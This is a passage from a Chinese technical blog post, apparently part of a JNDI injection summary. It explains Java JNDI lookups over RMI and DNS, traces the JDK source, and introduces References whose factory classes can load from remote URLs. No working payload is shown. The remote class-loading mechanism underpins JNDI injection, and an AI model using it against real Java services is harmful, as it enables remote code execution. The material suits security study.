alt="image-20250715172450950"></p></li><li><p><code>PROVIDER_URL</code>：保存环境属性名称的常量，用于指定服务提供者要使用的配置信息，该属性应包含一个URL字符串</p><p><img src="/archives/be65d471/image-20250715172642689.png" alt="image-20250715172642689"></p></li></ul><p>先设置环境变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">env.put(INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">env.put(PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:5432&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里相当于告诉JNDI要连接的是RMI注册表，它在127.0.0.1的5432端口</p><h4 id="初始化上下文"><a href="#初始化上下文" class="headerlink" title="初始化上下文"></a>初始化上下文</h4><p>初始化上下文需要用到InitialContext对象来为我们获取命名服务资源，JNDI也提供InitialDirContext对象为我们获取目录服务资源</p><p>这里初始化上下文，传入我们设置好的环境变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br></pre></td></tr></table></figure><p><img src="/archives/be65d471/image-20250716092306514.png" alt="image-20250716092306514"></p><p>传入的是Hashtable对象</p><p>如果不指定环境变量的话：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure><p>JNDI就会自动搜索系统属性System.getProperty()、applet参数和应用程序资源文件jndi.properties</p><p>所以也可以通过System.getProperty()设置环境变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">System.getProperty(Context.PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:5432&quot;</span>);</span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure><h4 id="通过上下文查找远程对象"><a href="#通过上下文查找远程对象" class="headerlink" title="通过上下文查找远程对象"></a>通过上下文查找远程对象</h4><p>利用提供的lookup方法，通过查询名字获取远程对象代理类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIInterface</span> <span class="variable">o</span> <span class="operator">=</span> (RMIInterface) ctx.lookup(<span class="string">&quot;b1uel0n3&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="调用远程方法"><a href="#调用远程方法" class="headerlink" title="调用远程方法"></a>调用远程方法</h4><p>最后调用远程方法即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(o.Hello());</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:5432&quot;</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">        RMIInterface o=(RMIInterface)ctx.lookup(<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        System.out.printf(o.Hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/be65d471/image-20250716093739555.png" alt="image-20250716093739555"></p><h3 id="DNS示例"><a href="#DNS示例" class="headerlink" title="DNS示例"></a>DNS示例</h3><p>与rmi一样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;dns://114.114.114.114&quot;</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line">        Object o=ctx.lookup(<span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/be65d471/image-20250716095055313.png" alt="image-20250716095055313"></p><p>这里我们打算使用DNS服务，从dns:&#x2F;&#x2F;114.114.114.114这个dns服务器上查询<a href="http://www.baidu.com域名对应的IP地址。但这里返回的是一个对象，由于我们用的是JNDI目录服务，而目录服务允许目录对象具有属性，那么我们就能通过目录服务获取ip这个属性值：">www.baidu.com域名对应的IP地址。但这里返回的是一个对象，由于我们用的是JNDI目录服务，而目录服务允许目录对象具有属性，那么我们就能通过目录服务获取ip这个属性值：</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DirContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line">Attributes o= ctx.getAttributes(<span class="string">&quot;www.baidu.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line">System.out.println(o);</span><br></pre></td></tr></table></figure><p>DNS记录类型：</p><table><thead><tr><th>记录类型</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td><strong><code>A</code></strong></td><td>IPv4 地址记录</td><td><code>www.baidu.com → 14.215.177.38</code></td></tr><tr><td><code>AAAA</code></td><td>IPv6 地址记录</td><td><code>www.example.com → 2001:db8::1</code></td></tr><tr><td><code>CNAME</code></td><td>别名记录</td><td><code>www → real-server.example.com</code></td></tr><tr><td><code>MX</code></td><td>邮件交换记录</td><td><code>@ → mail.example.com</code></td></tr><tr><td><code>TXT</code></td><td>文本记录</td><td><code>&quot;v=spf1 include:_spf.google.com ~all&quot;</code></td></tr><tr><td><code>NS</code></td><td>域名服务器记录</td><td><code>@ → ns1.alidns.com</code></td></tr></tbody></table><p><img src="/archives/be65d471/image-20250716095852346.png" alt="image-20250716095852346"></p><p>获得ipv4地址，通过这个地址可以访问百度</p><p>完整代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.Attributes;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;dns://114.114.114.114&quot;</span>);</span><br><span class="line">        <span class="type">DirContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line">        Attributes o= ctx.getAttributes(<span class="string">&quot;www.baidu.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="动态协议切换"><a href="#动态协议切换" class="headerlink" title="动态协议切换"></a>动态协议切换</h3><p>前面rmi和dns例子中我们都是通过设置INITIAL_CONTEXT_FACTORY和PROVIDER_URL的值来告诉JNDI我们要调用何种服务，从哪里获取这个服务。</p><p>而在Context.lookup()方法的参数中，用户可以指定自己的查找协议。JNDI会通过用户输入来动态识别要调用的服务以及路径：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String str=<span class="string">&quot;rmi://127.0.0.1:5432/b1uel0n3&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        RMIInterface o=(RMIInterface)ctx.lookup(str);</span><br><span class="line">        System.out.println(o.Hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/be65d471/image-20250716101138829.png" alt="image-20250716101138829"></p><p>这里我们并没有设置相应的环境变量来初始化Context，但是JNDI仍旧通过lookup()的参数识别出要调用的服务以及路径</p><p>默认支持自动转换的协议有：</p><p><img src="/./Java-JNDI%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F17bc9928-3021-4a46-93d3-d934ec0ebd7c%252FUntitled.png" alt="img"></p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><h4 id="命名服务初始化上下文"><a href="#命名服务初始化上下文" class="headerlink" title="命名服务初始化上下文"></a>命名服务初始化上下文</h4><p>这里拿rmi为例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br></pre></td></tr></table></figure><p><img src="/archives/be65d471/image-20250716141757325.png" alt="image-20250716141757325"></p><p>此时env不为空，调用enviroment.clone()方法：</p><p><img src="/archives/be65d471/image-20250716141853534.png" alt="image-20250716141853534"></p><p>重新赋值，这里对原始环境变量没用改动，随后调用init方法，传入环境变量：</p><p><img src="/archives/be65d471/image-20250716142207239.png" alt="image-20250716142207239"></p><p>调用了ResourceManager的静态方法getInitialEnvironment，传入环境变量，看文件名像时获取初始环境变量：</p><p><img src="/archives/be65d471/image-20250716142552798.png" alt="image-20250716142552798"></p><p><img src="/archives/be65d471/image-20250716142648680.png" alt="image-20250716142648680"></p><p>定义了一个PROPS变量，里面记录了Context接口的常量信息</p><p><img src="/archives/be65d471/image-20250716142947096.png" alt="image-20250716142947096"></p><p>然后获取APPLET属性，由于我们传入的环境变量只记录了Context.INITIAL_CONTEXT_FACTORY和Context.PROVIDER_URL的信息，所以这里applet参数为null</p><p><img src="/archives/be65d471/image-20250716143035245.png" alt="image-20250716143035245"></p><p><img src="/archives/be65d471/image-20250716144625909.png" alt="image-20250716144625909"></p><p>helper为VersionHelper对象，这里调用VersionHelper.getJndiProperties静态方法：</p><p><img src="/archives/be65d471/image-20250716144850955.png" alt="image-20250716144850955"></p><p>最后返回了长度为7的字符串数组，且都为null，似乎更像是在初始化</p><p><img src="/archives/be65d471/image-20250716145145212.png" alt="image-20250716145145212"></p><p>初始化Context接口每个常量的值，这里通过三个方面来获取值，首先从传入的环境变量找值，如果没用则通过applet，如果还没有就通过系统属性来获取值，这也正好解释了前面初始化上下文时可通过不传入env来设置环境变量</p><p>初始化环境变量后回到initialContext.init方法：</p><p><img src="/archives/be65d471/image-20250716150949410.png" alt="image-20250716150949410"></p><p>设置了初始化上下文工厂就会调用getDefaultInitCtx()方法，获取默认初始化上下文，先看下此时的变量：</p><p><img src="/archives/be65d471/image-20250716151244608.png" alt="image-20250716151244608"></p><p>跟进getDefaultInitCtx()方法：</p><p><img src="/archives/be65d471/image-20250716151549981.png" alt="image-20250716151549981"></p><p>调用了NamingManager.getInitialContext静态方法，传入myProps变量：<br><img src="/archives/be65d471/image-20250716151740756.png" alt="image-20250716151740756"></p><p>获取用户设置的工厂类</p><p><img src="/archives/be65d471/image-20250716151849884.png" alt="image-20250716151849884"></p><p>如果不为null就加载并实例化这个类：</p><p><img src="/archives/be65d471/image-20250716152135258.png" alt="image-20250716152135258"></p><p>最后调用RegistryContextFactory.getInitialContext方法，传入环境变量：</p><p><img src="/archives/be65d471/image-20250716152202482.png" alt="image-20250716152202482"></p><p><img src="/archives/be65d471/image-20250716152442517.png" alt="image-20250716152442517"></p><p>先拷贝参数值给var1，再调用URLToContext(getInitCtxURL(var1), var1)，先看getInitCtxURL方法：</p><p><img src="/archives/be65d471/image-20250716152941243.png" alt="image-20250716152941243"></p><p><img src="/archives/be65d471/image-20250716153118967.png" alt="image-20250716153118967"></p><p>获取环境变量指定的服务地址，这里就是rmi:&#x2F;&#x2F;127.0.0.1:5432</p><p>然后看URLToContext方法：</p><p><img src="/archives/be65d471/image-20250716153240150.png" alt="image-20250716153240150"></p><p>这里实例化了一个rmiURLContextFactory，这是一个专门用于处理 RMI URL 的上下文工厂，然后调用了getObjectInstance方法传入了服务地址和环境变量：</p><p><img src="/archives/be65d471/image-20250716153717542.png" alt="image-20250716153717542"></p><p>调用 getUsingURL方法：</p><p><img src="/archives/be65d471/image-20250716153756788.png" alt="image-20250716153756788"></p><p>实例化rmiURLContext对象，传入环境变量：</p><p><img src="/archives/be65d471/image-20250716153959295.png" alt="image-20250716153959295"></p><p><img src="/archives/be65d471/image-20250716154018964.png" alt="image-20250716154018964"></p><p>然后调用var2.lookup(var0);方法，即rmiURLContext父类GenericURLContext.lookup方法，传入服务地址：<br><img src="/archives/be65d471/image-20250716155136311.png" alt="image-20250716155136311"></p><p>最终调用RegistryContext.lookup方法：</p><p><img src="/archives/be65d471/image-20250716160054209.png" alt="image-20250716160054209"></p><p>根据上述过程中获取的信息初始化了一个新的RegistryContext，RegistryContext的构造方法：</p><p><img src="/archives/be65d471/image-20250716160221470.png" alt="image-20250716160221470"></p><p><img src="/archives/be65d471/image-20250716160202476.png" alt="image-20250716160202476"></p><p>返回结果：</p><p><img src="/archives/be65d471/image-20250716160948477.png" alt="image-20250716160948477"></p><p>最后获取到RegistryImpl_Stub对象，也就是相应的Stub，类似于RMI创建注册中心流程，后续将利用这个Stub获取远程对象</p><p>初始化结果：<br><img src="/archives/be65d471/image-20250716161151510.png" alt="image-20250716161151510"></p><h4 id="目录服务初始化上下文"><a href="#目录服务初始化上下文" class="headerlink" title="目录服务初始化上下文"></a>目录服务初始化上下文</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br></pre></td></tr></table></figure><p><img src="/archives/be65d471/image-20250716161933325.png" alt="image-20250716161933325"></p><p>调用父类方法：<br><img src="/archives/be65d471/image-20250716161956746.png" alt="image-20250716161956746"></p><p>后面流程和命名服务初始化一样</p><h4 id="命名服务获取远程对象"><a href="#命名服务获取远程对象" class="headerlink" title="命名服务获取远程对象"></a>命名服务获取远程对象</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMIInterface o=(RMIInterface)ctx.lookup(<span class="string">&quot;b1uel0n3&quot;</span>);</span><br></pre></td></tr></table></figure><p>调用了InitialContext.lookup方法：</p><p><img src="/archives/be65d471/image-20250716162424657.png" alt="image-20250716162424657"></p><p>调用getURLOrDefaultInitCtx(name).lookup(name)方法，先看getURLOrDefaultInitCtx(name)：</p><p><img src="/archives/be65d471/image-20250716162704104.png" alt="image-20250716162704104"></p><p>先if判断是否进行了上下文初始化，然后getURLScheme(name);对name进行解析，提取协议部分：</p><p><img src="/archives/be65d471/image-20250716163221347.png" alt="image-20250716163221347"></p><p>最后调用getDefaultInitCtx();方法：<br><img src="/archives/be65d471/image-20250716163505637.png" alt="image-20250716163505637"></p><p>而初始化上下文后，gotDefault值为true，最后直接返回defaultInitCtx变量，也就是初始化上下文生成的RegistryContext对象</p><p>接着看getURLOrDefaultInitCtx(name).lookup(name)的lookup方法，即RegistryContext.lookup(name)方法：</p><p><img src="/archives/be65d471/image-20250716163828940.png" alt="image-20250716163828940"></p><p>这里实例化一个CompositeName对象，可理解为将一个字符串名转换成对应的Name类型对象</p><p>接着调用RegistryContext.lookup()方法，只不过传入了类型为Name型：</p><p><img src="/archives/be65d471/image-20250716164104457.png" alt="image-20250716164104457"></p><p>此时var1不为空了，就会调用this.registry.lookup方法，不就是RegistryImpl_Stub.lookup方法，后面的查找过程就是rmi服务端查找远程对象的过程了</p><h4 id="目录服务获取属性"><a href="#目录服务获取属性" class="headerlink" title="目录服务获取属性"></a>目录服务获取属性</h4><p>以dns为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attributes o= ctx.getAttributes(<span class="string">&quot;www.baidu.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p>先调用InitialDirContext.getAttributes方法：</p><p><img src="/archives/be65d471/image-20250716165009584.png" alt="image-20250716165009584"></p><p>调用<code>getURLOrDefaultInitDirCtx(name).getAttributes(name, attrIds);</code>方法，先看前面getURLOrDefaultInitDirCtx(name)方法：</p><p><img src="/archives/be65d471/image-20250716170005902.png" alt="image-20250716170005902"></p><p>getURLOrDefaultInitCtx(name);逻辑与命名服务中的是一样的，这里返回的是DnsContext对象</p><p>回到InitialDirContext.getAttributes，接着调用getAttributes(name, attrIds)方法，由于DnsContext没有该方法，所以最后调用的是<code>PartialCompositeDirContext.getAttributes</code>方法:<br><img src="/archives/be65d471/image-20250716170136801.png" alt="image-20250716170136801"></p><p>依旧实例化一个CompositeName对象，将字符串名转化为Name类型对象，然后调用getAttributes(Name var1, String[] var2)方法：<br><img src="/archives/be65d471/image-20250716170442868.png" alt="image-20250716170442868"></p><p>先获取当前目录上下文和环境变量，并创建Continuation对象：</p><p><img src="/archives/be65d471/image-20250716170928411.png" alt="image-20250716170928411"></p><p>接着进入循环来获取值，这里调用了p_getAttributes方法：</p><p><img src="/archives/be65d471/image-20250716171542488.png" alt="image-20250716171542488"></p><p>调用了p_resolveIntermediate方法，如果是普通解析状态则会返回2，如果是需要处理”下一个命名系统”，则会返回3，这里状态为2，调用<code>var5 = this.c_getAttributes(var4.getHead(), var2, var3);</code>，其中var4.getHead()为传入的名称，跟进下：<br><img src="/archives/be65d471/image-20250716172524454.png" alt="image-20250716172524454"></p><p>查询逻辑在<code>this.getResolver().query(var4, var6.rrclass, var6.rrtype, this.recursion, this.authoritative);</code>，调用了Resolver.query方法：</p><p><img src="/archives/be65d471/image-20250716172747436.png" alt="image-20250716172747436"></p><p>然后调用dnsClient.query方法：</p><p><img src="/archives/be65d471/image-20250716173349862.png" alt="image-20250716173349862"></p><p><img src="/archives/be65d471/image-20250716173421139.png" alt="image-20250716173421139"></p><p>建立TCP连接并发送请求到相应DNS服务器上获取数据</p><h4 id="动态协议切换-1"><a href="#动态协议切换-1" class="headerlink" title="动态协议切换"></a>动态协议切换</h4><p>前面提到在初始化化上下文时没有指定环境变量，调用lookup方法，依然能通过服务地址直接获取相应对象，这里分析下代码逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str=<span class="string">&quot;rmi://127.0.0.1:5432/b1uel0n3&quot;</span>;</span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">RMIInterface o=(RMIInterface)ctx.lookup(str);</span><br></pre></td></tr></table></figure><p>先看下初始化后的变量：</p><p><img src="/archives/be65d471/image-20250717094551034.png" alt="image-20250717094551034"></p><p>可以看到是并没有存有服务地址，服务对象等相关变量的</p><p>跟进lookup方法：</p><p><img src="/archives/be65d471/image-20250717095227773.png" alt="image-20250717095227773"></p><p>先进入getURLOrDefaultInitCtx(name)：</p><p><img src="/archives/be65d471/image-20250717095356537.png" alt="image-20250717095356537"></p><p>解析了服务地址，获取了rmi协议，进入if语句，调用NamingManager.getURLContext方法：</p><p><img src="/archives/be65d471/image-20250717095801798.png" alt="image-20250717095801798"></p><p>接着调用getURLObject，传入协议名和环境变量：<br><img src="/archives/be65d471/image-20250717095913824.png" alt="image-20250717095913824"></p><p>调用了ResourceManager.getFactory方法</p><p>传入参数：</p><p><img src="/archives/be65d471/image-20250717100558567.png" alt="image-20250717100558567"></p><p>跟到关键部分：</p><p><img src="/archives/be65d471/image-20250717100904570.png" alt="image-20250717100904570"></p><p>得到的className就是我们要获取的工厂类：</p><p><img src="/archives/be65d471/image-20250717101307930.png" alt="image-20250717101307930"></p><p>然后调用<code> helper.loadClass(className, loader).newInstance();</code>加载这个工厂类并获取实例并返回这个对象</p><p>回到getURLObject方法：</p><p><img src="/archives/be65d471/image-20250717101522855.png" alt="image-20250717101522855"></p><p>获取工厂类实例后调用<code>factory.getObjectInstance(urlInfo, name, nameCtx, environment);</code>：</p><p><img src="/archives/be65d471/image-20250717101631810.png" alt="image-20250717101631810"></p><p><img src="/archives/be65d471/image-20250717101759021.png" alt="image-20250717101759021"></p><p>实例化一个rmiURLContext对象：</p><p><img src="/archives/be65d471/image-20250717102133856.png" alt="image-20250717102133856"></p><p><img src="/archives/be65d471/image-20250717102154835.png" alt="image-20250717102154835"></p><p>接着回到NamingManager.getURLContext方法，返回了实例化的rmiURLContext对象，属于Context类型：</p><p><img src="/archives/be65d471/image-20250717102703070.png" alt="image-20250717102703070"></p><p>再回到InitialContext.getURLOrDefaultInitCtx方法：</p><p><img src="/archives/be65d471/image-20250717102825070.png" alt="image-20250717102825070"></p><p>此时ctx不为null，直接返回ctx</p><p>接着调用rmiURLContext.lookup方法，由于rmiURLContext不存在该方法，所以调用父类GenericURLContext.lookup方法：</p><p><img src="/archives/be65d471/image-20250717103249851.png" alt="image-20250717103249851"></p><p>先调用getRootURLContext方法，对传入的服务地址进行解析，获取绑定名称、host、port等，跟进：</p><p><img src="/archives/be65d471/image-20250717103741915.png" alt="image-20250717103741915"></p><p>跟进RegistryContext构造函数：</p><p><img src="/archives/be65d471/image-20250717103851442.png" alt="image-20250717103851442"></p><p>跟进getRegistry方法：</p><p><img src="/archives/be65d471/image-20250717104315367.png" alt="image-20250717104315367"></p><p>传入的var0和var1分别是访问的host和端口，这里直接调用LocateRegistry.getRegistry(var0, var1)获取注册中心的存根，然后返回，所以这就明朗了</p><p>在getRootURLContext中最后实例了一个ResolveResult对象并返回，最后在GenericURLContext.lookup调用var3.lookup方法，即RegistryContext.lookup(“b1uel0n3”)，后面的流程就和命名服务时的一样了，这里就不跟了</p><h2 id="命名引用"><a href="#命名引用" class="headerlink" title="命名引用"></a>命名引用</h2><p>JNDI定义了命名引用，简称引用。其大致过程是通过绑定一个引用，将引用对象存储到命名&#x2F;目录服务中，命名管理器（Naming Manager）可以将引用解析为关联的原始对象</p><p>引用主要由Reference类来表示，每个Reference包含如何构造对应的对象的信息，包括引用对象的全限定类名，服务地址，以及创建对象的工厂类的名称和位置：</p><p><img src="/archives/be65d471/image-20250717110059639.png" alt="image-20250717110059639"></p><p>Reference可以使用工厂类来构造对象，当使用lookup查找对象时，Reference将使用提供的工厂类加载地址来加载工厂类，工厂类将构造出需要的对象，可以从远程加载地址来加载工厂类</p><p>Reference的一个构造方法：</p><p><img src="/archives/be65d471/image-20250717111138252.png" alt="image-20250717111138252"></p><p><img src="/archives/be65d471/image-20250717111200821.png" alt="image-20250717111200821"></p><ul><li>className：className为远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载</li><li>classFactory：工厂类名</li><li>classFactoryLocation：工厂类的加载地址，用于指定工厂类字节码的加载位置，可以是file:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;、http:&#x2F;&#x2F;等协议</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;refClassName&quot;</span>,<span class="string">&quot;FactoryClassName&quot;</span>,FactoryURL);</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">ctx.bind(<span class="string">&quot;refObj&quot;</span>, wrapper);</span><br></pre></td></tr></table></figure><h2 id="远程对象引用安全限制"><a href="#远程对象引用安全限制" class="headerlink" 